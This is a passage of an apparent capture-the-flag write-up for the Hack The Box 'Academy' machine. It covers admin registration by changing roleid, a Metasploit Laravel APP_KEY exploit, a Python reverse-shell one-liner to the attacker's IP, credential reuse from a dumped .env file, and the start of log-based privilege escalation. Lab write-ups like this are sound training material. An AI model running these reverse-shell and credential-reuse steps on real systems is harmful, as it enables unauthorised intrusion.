<strong>swagshop</strong> , and then officially announced it</p><p>It looks like an academy that <code class="language-plaintext highlighter-rouge">hackthebox</code> is going to start</p><p>I checked everything in here but got nothing</p><h1 id="testing-adminphp">Testing admin.php</h1><p>So i just think that how this <code class="language-plaintext highlighter-rouge">register.php</code> is working , i mean how it is sending data</p><p>Fired up burp and then started intercepting data</p><h2 id="registering-as-administrator">Registering as administrator</h2><p>I thought to register as username <code class="language-plaintext highlighter-rouge">admin</code></p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/7.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/7.png" alt="" /></a></p><p>and this was the <code class="language-plaintext highlighter-rouge">http</code> request</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/register.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">academy.htb</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">43</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://academy.htb</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-target="_blank"encoded</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://academy.htb/register.php</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ao0i6773k09fnr7a13dg9ansvq; ajs_anonymous_id=%2275392e50-209b-45b7-aeb3-2f19abfb3067%22; _fbp=fb.1.1604906116936.411205628</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
uid=admin&password=123&confirm=123&roleid=0
</pre></table></code></div></div><p>There is a thing <code class="language-plaintext highlighter-rouge">roleid</code> , i thought this is related to the permission , how a user going to treat is based on the <strong>roleid</strong></p><p>I changed the <code class="language-plaintext highlighter-rouge">roleid=1</code> and i got myself registered , yeah !!</p><p>But i was able to login on <code class="language-plaintext highlighter-rouge">login.php</code> and there was the same interface as normal user have</p><h2 id="login-as-administrator">Login as administrator</h2><p>Then i tried to register as <code class="language-plaintext highlighter-rouge">administartor</code> and changed the <strong>roleid</strong> to <code class="language-plaintext highlighter-rouge">1</code></p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/register.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">academy.htb</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">51</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://academy.htb</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-target="_blank"encoded</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://academy.htb/register.php</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ao0i6773k09fnr7a13dg9ansvq; ajs_anonymous_id=%2275392e50-209b-45b7-aeb3-2f19abfb3067%22; _fbp=fb.1.1604906116936.411205628</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
uid=administrator&password=123&confirm=123&roleid=1
</pre></table></code></div></div><p>Got the same <code class="language-plaintext highlighter-rouge">success-page.php</code> so it means i am registered successfully</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 09 Nov 2020 07:27:06 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.41 (Ubuntu)</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">location</span><span class="p">:</span> <span class="s">success-page.php</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3003</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
</pre></table></code></div></div><blockquote><p>login as <code class="language-plaintext highlighter-rouge">admninstrator : 123</code> on admin.php</p></blockquote><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/8.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/8.png" alt="" /></a></p><p>Oh , i am logged in !!</p><p>So there are two major things i saw !</p><div class="table-wrapper"><table><thead><tr><th>items<th>status<tbody><tr><td>Complete initial set of modules (cry0l1t3 / mrb3n)<td>done<tr><td>Fix issue with dev-staging-01.academy.htb<td>Pending</table></div><p>There are two <code class="language-plaintext highlighter-rouge">usernames</code> <strong>cry0l1t3</strong> , <strong>mrb3n</strong> , and there is another <code class="language-plaintext highlighter-rouge">VHOST</code> <strong>dev-staging-01.academy.htb</strong></p><blockquote><p>adding the vhost to the /etc/hosts file</p></blockquote><h1 id="rce-on-dev-staging-01academyhtb">RCE on dev-staging-01.academy.htb</h1><p>This is the first way to get <code class="language-plaintext highlighter-rouge">user</code></p><p>So after adding it in HOSts file i ca access the <strong>VHOST</strong> finally</p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/9.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/9.png" alt="" /></a></p><p>Its running on <code class="language-plaintext highlighter-rouge">Google code Prettify</code></p><p>And looking down in the webpage there are some infomation available</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>APP_NAME	<span class="s2">"Laravel"</span>
APP_ENV	    <span class="s2">"local"</span>
APP_KEY	    <span class="s2">"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="</span>
APP_DEBUG	<span class="s2">"true"</span>
<span class="nv">APP_target</span><span class="o">=</span><span class="s2">"_blank"</span>	    <span class="s2">"http://localhost"</span>
LOG_CHANNEL	<span class="s2">"stack"</span>
DB_CONNECTION	<span class="s2">"mysql"</span>
DB_HOST	    <span class="s2">"127.0.0.1"</span>
DB_PORT	    <span class="s2">"3306"</span>
DB_DATABASE	<span class="s2">"homestead"</span>
DB_USERNAME	<span class="s2">"homestead"</span>
DB_PASSWORD	<span class="s2">"secret"</span>
</pre></table></code></div></div><p>So there is <code class="language-plaintext highlighter-rouge">laravel</code> running , Its <strong>Vulnerable</strong> to <code class="language-plaintext highlighter-rouge">RCE</code> , if the <strong>APP_KEY</strong> is visible</p><h2 id="exploiting-via-msf">Exploiting via MSF</h2><p>There is a module available for the <code class="language-plaintext highlighter-rouge">laravel</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> search laravel
Matching Modules
<span class="o">================</span>
   <span class="c">#  Name                                              Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                              <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
msf5 <span class="o">&gt;</span>
</pre></table></code></div></div><blockquote><p>setting it up</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>unix/http/laravel_token_unserialize_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>
APP_KEY <span class="o">=&gt;</span> dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>
msf5 exploit<span class="o">(</span>unix/http/laravel_token_unserialize_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.78
LHOST <span class="o">=&gt;</span> 10.10.14.78
msf5 exploit<span class="o">(</span>unix/http/laravel_token_unserialize_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>VHOST dev-staging-01.academy.htb
</pre></table></code></div></div><p>Specified the <code class="language-plaintext highlighter-rouge">APP_KEY</code> i got from the <code class="language-plaintext highlighter-rouge">dev-staging-01.academy.htb</code></p><h1 id="shell-as-www-data">shell as www-data</h1><blockquote><p>running it</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>unix/http/laravel_token_unserialize_exec<span class="o">)</span> <span class="o">&gt;</span> run
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.78:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.78:4444 -&gt; 10.10.10.215:59336<span class="o">)</span> at 2020-11-09 13:17:24 +0530
</pre></table></code></div></div><p>and one command shell is opened YAY !!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.78:4444 -&gt; 10.10.10.215:59336<span class="o">)</span> at 2020-11-09 13:17:24 +0530
<span class="nb">whoami
</span>www-data
<span class="nb">hostname
</span>academy
</pre></table></code></div></div><h2 id="upgrading-shell">Upgrading shell</h2><p>python3 is installed</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.78",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
</pre></table></code></div></div><p>on by hand</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>root at Mohammadaassif <span class="k">in</span> /home/prashant 
<span class="nv">$ </span>rlwrap nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.10.14.78] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.215] 41770
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>851<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public<span class="err">$</span>
</pre></table></code></div></div><h1 id="enumeration-as-www-data">Enumeration as www-data</h1><p>After <code class="language-plaintext highlighter-rouge">enumerating</code> like one hour , i remember that <code class="language-plaintext highlighter-rouge">laravel</code> is installed , so there would be a <code class="language-plaintext highlighter-rouge">.env</code> file or something from there i got the <code class="language-plaintext highlighter-rouge">APP_KEY</code> as well</p><blockquote><p>.env file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>www-data@academy:/var/www/html/academy<span class="nv">$ </span><span class="nb">cat</span> .env
<span class="nb">cat</span> .env
<span class="nv">APP_NAME</span><span class="o">=</span>Laravel
<span class="nv">APP_ENV</span><span class="o">=</span><span class="nb">local
</span><span class="nv">APP_KEY</span><span class="o">=</span><span class="nb">base64</span>:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>
<span class="nv">APP_DEBUG</span><span class="o">=</span><span class="nb">false
</span><span class="nv">APP_target</span><span class="o">=</span><span class="s2">"_blank"</span><span class="o">=</span>http://localhost
<span class="nv">LOG_CHANNEL</span><span class="o">=</span>stack
<span class="nv">DB_CONNECTION</span><span class="o">=</span>mysql
<span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
<span class="nv">DB_PORT</span><span class="o">=</span>3306
<span class="nv">DB_DATABASE</span><span class="o">=</span>academy
<span class="nv">DB_USERNAME</span><span class="o">=</span>dev
<span class="nv">DB_PASSWORD</span><span class="o">=</span>mySup3rP4s5w0rd!!
<span class="nv">BROADCAST_DRIVER</span><span class="o">=</span>log
<span class="nv">CACHE_DRIVER</span><span class="o">=</span>file
<span class="nv">SESSION_DRIVER</span><span class="o">=</span>file
<span class="nv">SESSION_LIFETIME</span><span class="o">=</span>120
<span class="nv">QUEUE_DRIVER</span><span class="o">=</span><span class="nb">sync
</span><span class="nv">REDIS_HOST</span><span class="o">=</span>127.0.0.1
<span class="nv">REDIS_PASSWORD</span><span class="o">=</span>null
<span class="nv">REDIS_PORT</span><span class="o">=</span>6379
<span class="nv">MAIL_DRIVER</span><span class="o">=</span>smtp
<span class="nv">MAIL_HOST</span><span class="o">=</span>smtp.mailtrap.io
<span class="nv">MAIL_PORT</span><span class="o">=</span>2525
<span class="nv">MAIL_USERNAME</span><span class="o">=</span>null
<span class="nv">MAIL_PASSWORD</span><span class="o">=</span>null
<span class="nv">MAIL_ENCRYPTION</span><span class="o">=</span>null
<span class="nv">PUSHER_APP_ID</span><span class="o">=</span>
<span class="nv">PUSHER_APP_KEY</span><span class="o">=</span>
<span class="nv">PUSHER_APP_SECRET</span><span class="o">=</span>
<span class="nv">PUSHER_APP_CLUSTER</span><span class="o">=</span>mt1
<span class="nv">MIX_PUSHER_APP_KEY</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">PUSHER_APP_KEY</span><span class="k">}</span><span class="s2">"</span>
<span class="nv">MIX_PUSHER_APP_CLUSTER</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">PUSHER_APP_CLUSTER</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><p>So yes i got that file in <code class="language-plaintext highlighter-rouge">academy</code> dir , !!</p><h2 id="password-spraying">password spraying</h2><p>there is the password in there <code class="language-plaintext highlighter-rouge">DB_PASSWORD=mySup3rP4s5w0rd!!</code></p><p>there are lots of users in /home dir</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>www-data@academy:/home<span class="nv">$ </span><span class="nb">ls
ls
</span>21y4d
ch4p
cry0l1t3
egre55
g0blin
mrb3n
</pre></table></code></div></div><p>The password got matched for the user <code class="language-plaintext highlighter-rouge">cry0l1t3</code></p><h1 id="login-as-cry0l1t3">Login as cry0l1t3</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>www-data@academy:/home<span class="nv">$ </span>su - cry0l1t3
su - cry0l1t3
Password: mySup3rP4s5w0rd!!
<span class="nb">whoami
</span>cry0l1t3
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
</pre></table></code></div></div><p>since <code class="language-plaintext highlighter-rouge">ssh</code> is running i can get a more stable shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>root at Mohammadaassif <span class="k">in</span> /home/prashant 
<span class="nv">$ </span>sshpass <span class="nt">-p</span> <span class="s1">'mySup3rP4s5w0rd!!'</span> ssh cry0l1t3@academy.htb
Welcome to Ubuntu 20.04.1 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>
 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage
  System information as of Mon 09 Nov 2020 08:37:50 AM UTC
  System load:             0.1
  Usage of /:              47.6% of 15.68GB
  Memory usage:            15%
  Swap usage:              0%
  Processes:               173
  Users logged <span class="k">in</span>:         1
  IPv4 address <span class="k">for </span>ens160: 10.10.10.215
  IPv6 address <span class="k">for </span>ens160: dead:beef::250:56ff:feb9:23b6
 <span class="k">*</span> Introducing self-healing high availability clustering <span class="k">for </span>MicroK8s!
   Super simple, hardened and opinionated Kubernetes <span class="k">for </span>production.
     https://microk8s.io/high-availability
0 updates can be installed immediately.
0 of these updates are security updates.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Mon Nov  9 08:36:13 2020 from 10.10.14.38
<span class="err">$</span>
</pre></table></code></div></div><h1 id="second-way-to-get-user">Second way to get user</h1><p>So the second way is without the <code class="language-plaintext highlighter-rouge">RCE</code> , After knowing that <code class="language-plaintext highlighter-rouge">laravel</code> is running then the <strong>.env</strong> could be exposeable on the web server</p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/0.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/0.png" alt="" /></a></p><p>But there is no any file called <code class="language-plaintext highlighter-rouge">.env</code></p><p>Why not try on the <strong>HOST</strong> instead of the <code class="language-plaintext highlighter-rouge">VHOST</code> , maybe there would be a dir where the <code class="language-plaintext highlighter-rouge">.env</code> file is</p><h2 id="fuzzing-the-host">Fuzzing the host</h2><p>Maybe where is vhost is installed contains something</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-u</span> http://10.10.10.215/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404
Warning: <span class="nv">Pyctarget</span><span class="o">=</span><span class="s2">"_blank"</span> is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>
Target: http://10.10.10.215/FUZZ
Total requests: 220560
<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
<span class="o">===================================================================</span>
000006106:   301        9 L      28 W     314 Ch      <span class="s2">"academy"</span>
</pre></table></code></div></div><p>So i checked if the <code class="language-plaintext highlighter-rouge">academy</code> contains the <code class="language-plaintext highlighter-rouge">.env</code> file</p><p><a href="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/10.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="../hackthebox/academy/1ef5cc3d-cd70-41d3-8ef1-bea1da61c7c1/10.png" alt="" /></a></p><p>Now i have the <code class="language-plaintext highlighter-rouge">password</code></p><p>Now i remember that i got two users from the <code class="language-plaintext highlighter-rouge">admin-page</code> ,</p><ul><li>cry0l1t3<li>mrb3n</ul><p>Tried the password <code class="language-plaintext highlighter-rouge">mySup3rP4s5w0rd!!</code> for both the users on the using <code class="language-plaintext highlighter-rouge">ssh</code></p><p>and got success on <code class="language-plaintext highlighter-rouge">cry0l1t3</code> and logged in using <code class="language-plaintext highlighter-rouge">ssh</code></p><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
76c9e0445277e2509909b7c71d3199bd
</pre></table></code></div></div><h1 id="privliege-escalation-to-mrb3n">Privliege escalation to mrb3n</h1><p>Looking at the groups in which the user is</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
</pre></table></code></div></div><p>The user is in group <code class="language-plaintext highlighter-rouge">adm</code> which has permissions to view the <code class="language-plaintext highlighter-rouge">monitor</code> the system so he has access to the <code class="language-plaintext highlighter-rouge">/var/log</code></p><blockquote><p><a href="https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups" target="_blank">https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups</a></p></blockquote><p>so after checking the <strong>/var/log</strong> like ` 1/2 hour<code class="language-plaintext highlighter-rouge"> , i got the file </code>audit.log.3` in the <strong>audit</strong> dir</p><p>the data is something like this</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199290.086:83<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2517 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>7375206D7262336E0A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199293.906:84<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2520 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"su"</span> <span class="nv">data</span><span class="o">=</span>6D7262336E5F41634064336D79210A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199304.778:89<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2526 <span class="nv">uid</span><span class="o">=</span>1001 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>77686F616D690A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199308.262:90<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2526 <span class="nv">uid</span><span class="o">=</span>1001 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>657869740A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199317.622:93<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2517 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>2F62696E2F62617368202D690A
<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199443.421:94<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2606 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"nano"</span> <span class="nv">data</span><span class="o">=</span>1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
